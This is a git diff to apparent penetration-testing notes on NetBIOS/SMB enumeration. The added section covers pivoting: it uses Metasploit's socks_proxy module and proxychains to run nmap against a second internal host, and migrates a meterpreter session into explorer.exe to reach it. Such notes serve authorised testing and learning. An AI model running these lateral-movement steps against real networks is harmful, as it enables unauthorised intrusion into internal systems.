@@ -39,7 +39,7 @@ SMB lets you shares files , disks, directories, printers.
 
 ---
 
-* How to enum NetBIOS
+* How to enum NetBIOS & Pivoting
 
 1-Gather information about target
 
@@ -73,7 +73,33 @@ SMB lets you shares files , disks, directories, printers.
 
 7- Start the socks proxy server to access the pivot system on the attacker's machine using the proxychains tool.
 
->
+> cat /etc/proxychains4.conf                          (check the proxy port)
+
+![image](https://user-images.githubusercontent.com/73122852/231012959-a2223c61-e9fa-4bfc-9c52-b29427526f36.png)
+
+> background                                       (to run the current session in the backgroud)
+> use auxiliary/server/socks_proxy
+> show options
+> set SRVPORT PORTHere
+> set VERSION 4a 
+> exploit
+> jobs                                                  (to see the current jobs)
+
+![image](https://user-images.githubusercontent.com/73122852/231013241-6174b314-59c1-4524-99d4-b65d54ade603.png)
+
+8- Now we can run nmap to scan the filterd ports
+
+> proxychains nmap 192.168.x2.x2 -sT -Pn -sV -p 445
+
+9- trying to move to the second target
+
+> net view 192.168.x2.x2
+
+if that failed that because we need privilege, So back to meterpreter
+
+> migrate -N explorer.exe
+> net view 192.168.x2.x2
+
 
 ---
 
